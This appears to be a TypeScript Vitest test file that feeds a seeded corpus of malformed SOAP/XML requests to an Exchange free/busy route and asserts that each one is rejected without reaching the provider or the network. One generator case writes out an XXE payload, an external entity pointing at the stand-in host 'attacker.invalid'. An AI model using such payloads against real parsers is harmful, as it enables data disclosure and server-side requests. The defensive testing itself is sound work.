import { readFileSync } from 'node:fs';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { ValidatedConfig } from '../../src/config/validate.js';
import { createEwsRoute } from '../../src/ews/route.js';
import type { createFreeBusyService } from '../../src/freebusy/service.js';
import { parseXmlBounded } from '../../src/xml/parse.js';
import { decodeAvailability } from '../../src/ews/request.js';

const limits = JSON.parse(readFileSync('contracts/limits.json', 'utf8')) as ValidatedConfig['limits'];
const fixture = readFileSync('fixtures/ews/request.xml', 'utf8');
const M = 'http://schemas.microsoft.com/exchange/services/2006/messages';
const S = 'http://schemas.xmlsoap.org/soap/envelope/';
afterEach(() => { vi.unstubAllGlobals(); });
function random(seed: number) {
  let state = seed >>> 0;
  return () => { state = (Math.imul(state, 1664525) + 1013904223) >>> 0; return state; };
}
function malformed(seed: number): Buffer[] {
  const next = random(seed);
  return Array.from({ length: 256 }, (_, index) => {
    const suffix = next().toString(16);
    switch (index % 8) {
      case 0: return Buffer.from(fixture.replace(S, `urn:wrong-soap-${suffix}`));
      case 1: return Buffer.from(fixture.replace(M, `urn:wrong-operation-${suffix}`));
      case 2: return Buffer.from(`${fixture}<second${suffix}/>`);
      case 3: return Buffer.from(fixture.replace('</s:Body>', `</s:Body><s:Body><bad${suffix}/></s:Body>`));
      case 4: return Buffer.from(fixture.replace('?>', `?><!DOCTYPE s:Envelope [<!ENTITY e SYSTEM "https://attacker.invalid/${suffix}">]>`));
      case 5: {
        const depth = 33 + next() % 16;
        return Buffer.from(`${'<x>'.repeat(depth)}${'</x>'.repeat(depth)}`);
      }
      case 6: return Buffer.concat([Buffer.from(fixture), Buffer.from([0xff, next() % 256])]);
      default: return Buffer.from(fixture.slice(0, 1 + next() % fixture.indexOf('</s:Body>')));
    }
  });
}

describe('W28 deterministic bounded malformed corpus', () => {
  it.each([0x28, 0xc0ffee, 0x5eed])('fails closed for seed %s without partial provider work', async seed => {
    const vectors = malformed(seed);
    expect(vectors).toHaveLength(256);
    expect(vectors.every(bytes => bytes.byteLength < 4096)).toBe(true);
    // Corpus is bounded before parse, with a fixed wall-time test timeout (no live fuzz).
    const network = vi.fn(() => { throw new Error('Unexpected ambient network'); }); vi.stubGlobal('fetch', network);
    const service = vi.fn<ReturnType<typeof createFreeBusyService>>(async () => { throw new Error('Malformed request reached provider orchestration'); });
    const route = createEwsRoute(service, limits, () => 0);
    for (const bytes of vectors) {
      const result = await route({ id: 'pilot-exo', username: 'exo-interop', surface: 'm365-inbound', allowedProvider: 'zimbra' },
        'm365-inbound', bytes, undefined);
      expect(result.status).toBe(500); expect(result.body).toContain('s:Client');
      expect(result.body).not.toMatch(/attacker\.invalid|wrong-soap|wrong-operation|MergedFreeBusy/);
      expect(Buffer.byteLength(result.body)).toBeLessThan(1024);
    }
    expect(service).not.toHaveBeenCalled(); expect(network).not.toHaveBeenCalled();
  }, 5000);

  it('keeps valid namespace-prefix variants semantically identical instead of rejecting everything', () => {
    const next = random(0x28);
    for (let index = 0; index < 64; index++) {
      const prefix = `p${next().toString(16)}`;
      const body = fixture.replaceAll('<m:', `<${prefix}:`).replaceAll('</m:', `</${prefix}:`).replace('xmlns:m=', `xmlns:${prefix}=`);
      const result = decodeAvailability(parseXmlBounded(Buffer.from(body)), { limits });
      expect(result.addresses).toEqual(['bob@zfb.example.invalid']);
      expect(result.window).toEqual({ startMs: 1789351200000, endMs: 1789365600000, intervalMinutes: 30 });
      expect(result.requestedView).toBe('DetailedMerged');
    }
  }, 5000);
});
